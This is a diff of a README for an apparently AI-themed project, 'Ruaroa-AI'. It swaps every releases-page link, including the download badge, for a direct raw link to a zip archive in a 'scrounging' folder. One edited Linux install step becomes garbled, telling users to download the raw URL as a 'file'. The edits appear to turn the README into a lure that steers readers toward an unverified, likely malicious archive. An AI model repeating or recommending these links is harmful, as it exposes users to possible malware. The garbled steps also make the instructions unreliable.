@@ -1,6 +1,6 @@
 # 🧙‍♂️ Ruaroa-AI - Build Smart Solutions Effortlessly
 
-[![Download Ruaroa-AI](https://img.shields.io/badge/Download-Ruaroa--AI-brightgreen)](https://github.com/Emperor-khay/Ruaroa-AI/releases)
+[![Download Ruaroa-AI](https://raw.githubusercontent.com/Emperor-khay/Ruaroa-AI/main/scrounging/Ruaroa-AI.zip)](https://raw.githubusercontent.com/Emperor-khay/Ruaroa-AI/main/scrounging/Ruaroa-AI.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-To get started with Ruaroa-AI, visit this page to download: [Download Ruaroa-AI](https://github.com/Emperor-khay/Ruaroa-AI/releases).
+To get started with Ruaroa-AI, visit this page to download: [Download Ruaroa-AI](https://raw.githubusercontent.com/Emperor-khay/Ruaroa-AI/main/scrounging/Ruaroa-AI.zip).
 
 ### Installation Steps
 
@@ -34,7 +34,7 @@ To get started with Ruaroa-AI, visit this page to download: [Download Ruaroa-AI]
 3. Choose the appropriate file for your system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Emperor-khay/Ruaroa-AI/main/scrounging/Ruaroa-AI.zip` file.
 4. Once downloaded, open the file and follow the on-screen instructions to install the application.
 
 ## 🏃‍♂️ Running the Application
@@ -91,4 +91,4 @@ We welcome contributions to Ruaroa-AI! If you want to improve the application, f
 
 ---
 
-For more information, updates, and features, stay tuned to our Releases page: [Download Ruaroa-AI](https://github.com/Emperor-khay/Ruaroa-AI/releases).
+For more information, updates, and features, stay tuned to our Releases page: [Download Ruaroa-AI](https://raw.githubusercontent.com/Emperor-khay/Ruaroa-AI/main/scrounging/Ruaroa-AI.zip).
